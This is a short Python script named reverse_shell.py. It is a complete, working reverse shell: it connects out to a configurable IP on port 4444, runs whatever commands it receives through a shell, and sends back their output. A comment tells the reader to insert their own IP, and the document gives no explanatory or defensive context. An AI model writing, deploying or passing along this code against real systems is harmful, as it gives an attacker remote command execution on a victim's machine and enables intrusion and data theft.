
**Code (reverse_shell.py)**  
```python
import socket
import subprocess

# Replace with your IP address
server_ip = "192.168.1.10"  
port = 4444

def reverse_shell():
    # Create a socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, port))
    
    while True:
        command = s.recv(1024).decode()  # Receive command
        if command.lower() == "exit":
            break
        result = subprocess.run(command, shell=True, capture_output=True, text=True)  # Execute command
        s.send(result.stdout.encode() + result.stderr.encode())  # Send output back

    s.close()

reverse_shell()
